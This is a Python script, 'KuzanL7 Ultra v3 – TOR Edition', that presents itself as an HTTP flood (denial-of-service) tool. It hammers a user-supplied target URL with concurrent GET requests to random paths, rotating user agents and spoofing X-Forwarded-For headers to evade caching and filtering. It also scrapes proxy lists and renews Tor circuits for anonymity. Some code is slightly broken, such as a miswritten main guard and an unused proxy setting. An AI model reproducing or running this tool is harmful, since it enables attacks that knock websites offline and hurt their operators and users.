#!/usr/bin/env python3
# KuzanL7 Ultra v3 – TOR Edition (Tor Mode ON)
# By Kuzan & Lolipop (Nusantara) 

import os
import sys
import asyncio
import aiohttp
import random
import string
import time
import requests
from stem import Signal
from stem.control import Controller

# ================= SETTINGS TOR ================= #
TOR_PORT = 9050
TOR_CONTROL_PORT = 9051
TOR_PASSWORD = ""  # Set if your Tor need a password 
PROXY_FILE = "proxies.txt"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
]

def auto_install():
    try:
        import stem, aiohttp
    except ImportError:
        os.system("pip install aiohttp requests[socks] stem")

def scrape_proxies():
    urls = [
        "https://api.openproxy.space/lists/http.txt",
        "https://spys.me/proxy.txt"
    ]
    proxies = set()
    for url in urls:
        try:
            r = requests.get(url, timeout=100000)
            for line in r.text.splitlines():
                if ":" in line:
                    proxies.add(line.strip())
        except:
            pass
    with open(PROXY_FILE, "w") as f:
        for p in proxies:
            f.write(p + "\n")
    print(f"[+] {len(proxies)} proxies scraped.")

def renew_tor():
    try:
        with Controller.from_port(port=TOR_CONTROL_PORT) as c:
            if TOR_PASSWORD:
                c.authenticate(password=TOR_PASSWORD)
            else:
                c.authenticate()
            c.signal(Signal.NEWNYM)
        print("[*] Tor circuit renewed.")
    except Exception as e:
        print(f"[!] Tor renew failed: {e}")

def random_path():
    return "/" + "".join(random.choices(string.ascii_letters + string.digits, k=8))

async def attack(session, target, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            url = target + random_path()
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "X-Forwarded-For": ".".join(str(random.randint(0,255)) for _ in range(4))
            }
            async with session.get(url, headers=headers, timeout=5) as resp:
                await resp.text()
        except:
            pass

async def main(target, duration, threads):
    proxy_url = f"socks5://127.0.0.1:{TOR_PORT}"
    conn = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = []
        for _ in range(threads):
            tasks.append(attack(session, target, duration))
        await asyncio.gather(*tasks)

if name == "main":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <target_url> <time_seconds> <threads>")
        sys.exit(1)

    target = sys.argv[1]
    duration = int(sys.argv[2])
    threads = int(sys.argv[3])

    auto_install()
    scrape_proxies()
    renew_tor()

    try:
        asyncio.run(main(target, duration, threads))
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
